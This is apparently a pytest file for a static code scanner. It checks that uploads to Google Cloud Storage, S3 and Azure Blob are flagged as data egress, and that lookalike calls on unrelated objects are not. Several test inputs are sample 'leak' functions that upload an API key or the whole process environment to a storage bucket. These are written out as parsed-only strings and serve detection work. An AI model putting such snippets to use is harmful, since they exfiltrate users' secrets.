"""An upload to a cloud store is a send (`flows/http_clients.py`, `AnalyzerCore._resolve_callee`).

Every source is assembled for the test and only parsed. The twins call the same method names with
no cloud-storage library in the file."""

from __future__ import annotations

from cordon_scanner.analysis.python.pyast import PythonAnalyzer


class Kit:
    @staticmethod
    def kinds(source: str) -> set[str]:
        return {
            f"{h.capability.value}:{h.detail.split(':')[0].split(' ')[0]}"
            for h in PythonAnalyzer.analyse(source)
        }


class TestAnUploadIsASend:
    def test_a_gcs_blob_upload_is_egress(self) -> None:
        source = (
            "from google.cloud import storage\n"
            "def put(name, text):\n"
            "    blob = storage.Client().bucket('b').blob(name)\n"
            "    blob.upload_from_string(text)\n"
        )
        assert "egress:cloud_storage.upload_from_string" in Kit.kinds(source)

    def test_an_environment_value_uploaded_is_sent(self) -> None:
        source = (
            "import os\n"
            "from google.cloud import storage\n"
            "def leak():\n"
            "    value = os.getenv('API_KEY')\n"
            "    storage.Client().bucket('b').blob('k').upload_from_string(value)\n"
        )
        assert any(k.startswith("egress:") for k in Kit.kinds(source))

    def test_the_whole_environment_uploaded_is_sent(self) -> None:
        source = (
            "import os\n"
            "from google.cloud import storage\n"
            "def leak():\n"
            "    storage.Client().bucket('b').blob('k').upload_from_string(str(dict(os.environ)))\n"
        )
        assert any("environment sent" in h.detail for h in PythonAnalyzer.analyse(source))

    def test_boto3_put_object(self) -> None:
        source = "import boto3\ndef go(data):\n    boto3.client('s3').put_object(Bucket='b', Key='k', Body=data)\n"
        assert "egress:cloud_storage.put_object" in Kit.kinds(source)

    def test_azure_upload_blob(self) -> None:
        source = (
            "from azure.storage.blob import BlobClient\n"
            "def go(data):\n"
            "    BlobClient.from_connection_string('x', 'c', 'b').upload_blob(data)\n"
        )
        assert "egress:cloud_storage.upload_blob" in Kit.kinds(source)


class TestTheSameNamesWithoutACloudLibrary:
    def test_a_web_frameworks_upload_file(self) -> None:
        source = "def go(storage, data):\n    storage.upload_file(data)\n"
        assert not any(k.startswith("egress:") for k in Kit.kinds(source))

    def test_a_put_object_on_an_unrelated_client(self) -> None:
        source = "import requests\ndef go(db, row):\n    db.put_object(row)\n"
        assert "egress:cloud_storage.put_object" not in Kit.kinds(source)
